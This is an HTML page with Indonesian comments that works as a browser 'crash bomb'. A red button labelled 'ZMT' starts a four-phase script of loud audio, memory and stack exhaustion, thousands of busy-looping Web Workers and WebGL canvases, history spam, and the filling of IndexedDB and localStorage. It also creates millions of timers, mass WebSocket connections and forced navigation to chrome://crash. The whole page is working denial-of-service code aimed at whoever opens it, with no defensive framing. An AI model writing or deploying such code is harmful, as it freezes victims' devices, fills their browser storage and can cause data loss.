<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ANAK BAIK</title>
    <style>
        body {
            margin: 0;
            background: black;
            color: white;
            font-family: 'Courier New', monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            flex-direction: column;
        }
        #btn {
            font-size: 4rem;
            padding: 30px 100px;
            background: red;
            border: 5px solid white;
            border-radius: 80px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 0 100px red;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        #status {
            margin-top: 50px;
            font-size: 2rem;
            color: lime;
            display: none;
            text-align: center;
            white-space: pre-line;
        }
    </style>
</head>
<body>
    <div id="btn">🖕🏿ZMT🖕🏿</div>
    <div id="status"></div>

    <script>
        document.getElementById('btn').onclick = function() {
            const btn = this;
            const statusDiv = document.getElementById('status');
            
            // Sembunyikan tombol, tampilkan status
            btn.style.display = 'none';
            statusDiv.style.display = 'block';
            
            // ========== PLAY CRASH.MP3 (TAMBAHAN DARI USER) ==========
            try {
                let crashSound = new Audio('crash.mp3');
                crashSound.volume = 1.0;  // Maksimalin volume
                crashSound.play();
            } catch (e) {
                console.log('Gagal mainin crash.mp3, mungkin file gak ada');
            }
            
            // Mulai waktu
            const startTime = Date.now();
            
            // ========== SUARA 10.000 (LANGSUNG) ==========
            for (let ctx = 0; ctx < 500; ctx++) {
                try {
                    let a = new (window.AudioContext || window.webkitAudioContext)();
                    let g = a.createGain();
                    g.gain.value = 0.002;
                    g.connect(a.destination);
                    for (let i = 0; i < 20; i++) {
                        let o = a.createOscillator();
                        o.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random() * 4)];
                        o.frequency.value = 10 + Math.random() * 7000;
                        let og = a.createGain();
                        og.gain.value = 0.0001;
                        o.connect(og);
                        og.connect(g);
                        o.start();
                    }
                    if (a.state === 'suspended') a.resume();
                } catch (e) {}
            }

            // ========== FUNGSI UPDATE STATUS ==========
            function updateStatus() {
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                let phase = '';
                if (elapsed < 15) phase = '⚡ FASE 1: MEMORY LEAK (0-15 detik) ⚡';
                else if (elapsed < 30) phase = '💀 FASE 2: WORKER & WEBGL (15-30 detik) 💀';
                else if (elapsed < 45) phase = '🔥 FASE 3: SHARED & INDEXEDDB (30-45 detik) 🔥';
                else phase = '☠️ FASE 4: INFINITE LOOP (45-60 detik) ☠️';
                
                statusDiv.innerText = `${phase}\n\nWaktu: ${elapsed} detik\n\nChrome makin berat...`;
                
                if (elapsed < 60) {
                    requestAnimationFrame(updateStatus);
                } else {
                    statusDiv.innerText = '💥 CHROME AKAN SEGERA TUMBANG 💥';
                }
            }
            requestAnimationFrame(updateStatus);

            // ========== FASE 1: MEMORY LEAK + STACK OVERFLOW (0-15 detik) ==========
            (function fase1() {
                let memLeak = [];
                // Stack overflow bertahap (rekursif dengan interval)
                function stackLoop(depth) {
                    if (depth > 100000) return;
                    stackLoop(depth + 1);
                }
                // Jalankan stack overflow setiap 100ms
                let stackInterval = setInterval(() => {
                    try { stackLoop(0); } catch(e){}
                }, 100);
                
                // Alokasi memory besar tiap 10ms
                let memInterval = setInterval(() => {
                    for (let i = 0; i < 1000; i++) {
                        try {
                            memLeak.push(new ArrayBuffer(10000000)); // 10MB
                            memLeak.push(new Blob([new Uint8Array(50000000)])); // 50MB
                            memLeak.push(new Array(1000000).join('x')); // 1MB
                        } catch(e){}
                    }
                }, 10);
                
                // Hentikan setelah 15 detik
                setTimeout(() => {
                    clearInterval(stackInterval);
                    clearInterval(memInterval);
                }, 15000);
            })();

            // ========== FASE 2: WEB WORKER + WEBGL + HISTORY SPAM (15-30 detik) ==========
            setTimeout(() => {
                // 20.000 Web Worker (bertahap)
                for (let w = 0; w < 20000; w++) {
                    setTimeout(() => {
                        try {
                            new Worker(URL.createObjectURL(new Blob([`
                                while(1) {
                                    for(let i=0;i<999999;i++) { Math.sqrt(i); }
                                }
                            `])));
                        } catch(e){}
                    }, w * 2); // sebarkan selama 40 detik (2*20000 = 40000ms) tapi kita hanya punya 15 detik, jadi padatkan
                }
                
                // 10.000 Canvas WebGL
                for (let g = 0; g < 10000; g++) {
                    setTimeout(() => {
                        try {
                            let c = document.createElement('canvas');
                            c.width = 2048;
                            c.height = 2048;
                            let gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                            if (gl) {
                                for (let t = 0; t < 100; t++) {
                                    gl.createTexture();
                                    gl.createBuffer();
                                }
                            }
                            document.body.appendChild(c);
                        } catch(e){}
                    }, g * 3);
                }
                
                // History spam tiap 1ms
                let histInterval = setInterval(() => {
                    for (let h = 0; h < 1000; h++) {
                        try { history.pushState({}, '', '/#' + Math.random()); } catch(e){}
                    }
                }, 1);
                
                setTimeout(() => clearInterval(histInterval), 15000);
            }, 15000);

            // ========== FASE 3: SHAREDARRAYBUFFER + INDEXEDDB + TIMER (30-45 detik) ==========
            setTimeout(() => {
                // SharedArrayBuffer (jika didukung)
                if (typeof SharedArrayBuffer !== 'undefined') {
                    for (let s = 0; s < 100000; s++) {
                        setTimeout(() => {
                            try { new SharedArrayBuffer(100000000); } catch(e){}
                        }, s);
                    }
                }
                
                // IndexedDB bomb
                try {
                    let req = indexedDB.open('killerdb', 1);
                    req.onsuccess = function(e) {
                        let db = e.target.result;
                        for (let t = 0; t < 1000; t++) {
                            if (!db.objectStoreNames.contains('s' + t)) {
                                let store = db.createObjectStore('s' + t, { keyPath: 'id' });
                                for (let d = 0; d < 10000; d++) {
                                    try { store.put({ id: d, data: 'x'.repeat(100000) }); } catch(e){}
                                }
                            }
                        }
                    };
                } catch(e){}
                
                // Timer overload 5 juta timer (disebar)
                for (let t = 0; t < 5000000; t++) {
                    setTimeout(() => {
                        setInterval(() => {
                            for(let z=0;z<1000;z++){ Math.random(); }
                        }, 0);
                    }, t % 15000); // sebarkan selama 15 detik
                }
                
                // LocalStorage penuh
                for (let s = 0; s < 500000; s++) {
                    setTimeout(() => {
                        try { localStorage.setItem('k' + s, 'x'.repeat(100000)); } catch(e){}
                    }, s % 15000);
                }
            }, 30000);

            // ========== FASE 4: INFINITE LOOP + ARRAY PUSH + RELOAD (45-60 detik) ==========
            setTimeout(() => {
                // WebSocket bomb 10.000 koneksi
                for (let ws = 0; ws < 10000; ws++) {
                    try { new WebSocket('ws://localhost:' + ws); } catch(e){}
                }
                
                // Infinite loop di worker (sudah banyak dari fase 2)
                // Tambah loop berat di main thread secara bertahap
                let arr = [];
                let loopInterval = setInterval(() => {
                    for (let i = 0; i < 100000; i++) {
                        try {
                            arr.push(new ArrayBuffer(100000000));
                            arr.push(new Array(1000000).join('x'));
                        } catch(e){}
                    }
                }, 0);
                
                // Reload paksa berkala
                let reloadInterval = setInterval(() => {
                    try { location.replace('chrome://crash'); } catch(e){}
                    try { location.replace('about:crash'); } catch(e){}
                }, 100);
                
                setTimeout(() => {
                    clearInterval(loopInterval);
                    clearInterval(reloadInterval);
                }, 15000);
            }, 45000);
        };
    </script>
</body>
</html>
